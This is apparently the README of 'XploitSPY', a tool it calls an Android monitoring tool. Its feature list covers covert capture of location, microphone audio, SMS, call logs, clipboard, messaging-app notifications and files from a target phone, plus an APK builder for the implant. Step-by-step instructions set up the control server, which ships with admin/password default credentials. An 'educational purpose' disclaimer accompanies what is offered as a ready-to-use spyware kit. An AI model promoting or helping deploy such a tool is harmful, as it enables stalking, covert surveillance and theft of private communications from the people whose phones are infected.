<p align="center">
<img src="https://github.com/XploitWizer/XploitSPY/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based Android Monitoring Tool, powered by NodeJS
</p>

## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Device Admin
- Built In APK Builder



## Prerequisites 
 - Java Runtime Environment 11 or above
 - NodeJs 
 - A Server with Static IP Address

## Installation 
1. Install JRE 11 
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-11-jre`
   
2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `sudo npm install pm2 -g`

4. Clone the repo
    - `git clone https://github.com/XploitWizer/XploitSPY.git`
    
5. Go to server directory
   - `cd XploitSPY/server/`

5. In the server directory, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run XploitSPY on startup

6. Find your public IP `curl ifconfig.me`

7. In your browser navigate to your Server Static IP Address` Ex.: http://192.168.55.203`

8. Login details
     - `Username : admin`
     - `Password : password`
    
It's recommended to run XploitSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)


## Buy us a Coffee
   Bitcoin : 3HwzRLbZxFVxyZzLoEHFnoB5RVKfzwxDbf
   
   Paypal : https://paypal.me/raomk



## Disclaimer
<b>XploitWizer Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
XploitSPY is built for Educational Purpose. Use at your own Risk.</b>

<br>
<p align="center">Made with ❤️ By <a href="https://xploitwizer.com">XploitWizer</a></p>

## Credits

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>
